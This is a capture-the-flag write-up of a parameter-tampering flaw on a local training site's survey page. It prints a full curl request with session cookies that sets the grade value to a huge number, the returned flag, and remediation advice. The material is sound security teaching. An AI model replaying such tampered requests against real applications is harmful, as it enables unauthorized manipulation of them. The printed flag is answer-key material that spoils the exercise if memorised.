# Breach Name: Parameter Tampering in Survey Grade Submission
## Description of the Breach

This breach was identified on the survey page of the website, where an input parameter used to submit survey grades was vulnerable to manipulation. By intercepting the request and modifying the grade value to an excessively large number, we were able to retrieve a hidden flag.

## Steps to Reproduce

1. Navigate to the Survey Page:
	- From the homepage, go to the survey page:
	  ```bash
	  http://localhost:8080/index.php?page=survey
	  ```

2. Inspect the Network Request:
	- Use the browser's developer tools to open the "Network" tab. Change the survey grade on the page, and observe the POST request that is made when the grade is submitted.

3. Copy the Request as cURL:
	- Right-click on the identified request and select "Copy as cURL". This provides a cURL command that you can use to replay and modify the request.

4. Modify the Grade Value:
	- In the copied cURL command, modify the `valeur` parameter to a very large number:
	  ```bash
	  curl 'http://localhost:8080/index.php?page=survey' \
	  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
	  -H 'Accept-Language: en-US,en' \
	  -H 'Cache-Control: max-age=0' \
	  -H 'Connection: keep-alive' \
	  -H 'Content-Type: application/x-www-form-urlencoded' \
	  -H 'Cookie: csrftoken=6la8Whx71kgYwiu1HUqby8bGHiSkJf2j9rlT80LuniGLvkJzAtbJNOx4EK5rXVKe; sessionid=wkyan96hdzkvna3h6vfkck2lbsci7d30; I_am_admin=' \
	  -H 'Origin: http://localhost:8080' \
	  -H 'Referer: http://localhost:8080/index.php?page=survey' \
	  -H 'Sec-Fetch-Dest: document' \
	  -H 'Sec-Fetch-Mode: navigate' \
	  -H 'Sec-Fetch-Site: same-origin' \
	  -H 'Sec-Fetch-User: ?1' \
	  -H 'Sec-GPC: 1' \
	  -H 'Upgrade-Insecure-Requests: 1' \
	  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' \
	  -H 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"' \
	  -H 'sec-ch-ua-mobile: ?0' \
	  -H 'sec-ch-ua-platform: "Linux"' \
	  --data-raw 'sujet=3&valeur=200000000000000000000000000000000000000'
	  ```
	  Explanation: This command modifies the grade value (`valeur`) to an extremely large number, far beyond the expected input range.

5. Execute the cURL Command:
	- Run the modified cURL command in your terminal. The server processes the request and responds with a hidden message.

6. Retrieve the Flag:
	- The server's response includes the following HTML, revealing the flag:
	  ```html
	  <h2 style="margin-top:50px;"> The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa</h2>
	  ```
	  Flag: 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa

## Explanation of the Breach

The vulnerability here is a Parameter Tampering flaw, where user input on the survey page is not properly validated. By modifying the `valeur` parameter to an unusually large number, we exploited the lack of input validation to trigger an unintended server response, revealing a hidden flag.

## How to Fix the Breach

1. Implement Server-Side Input Validation:
	- Ensure that all input values are validated on the server side, particularly those related to critical functions like survey submissions. The input should be checked for acceptable ranges, types, and formats.

2. Enforce Proper Data Types:
	- Limit the input values to a specific data type and range that aligns with the application's requirements (e.g., integers within a certain range for survey grades).

3. Use Stronger Error Handling:
	- Implement robust error handling that can gracefully manage unexpected inputs and prevent the application from exposing sensitive information or behaving unpredictably.

4. Monitor and Log Suspicious Activity:
	- Implement logging and monitoring to detect unusual or suspicious input patterns, such as excessively large numbers or repeated tampering attempts.

5. Implement Rate Limiting:
	- Apply rate limiting on sensitive endpoints to reduce the risk of automated or brute-force attacks attempting to exploit similar vulnerabilities.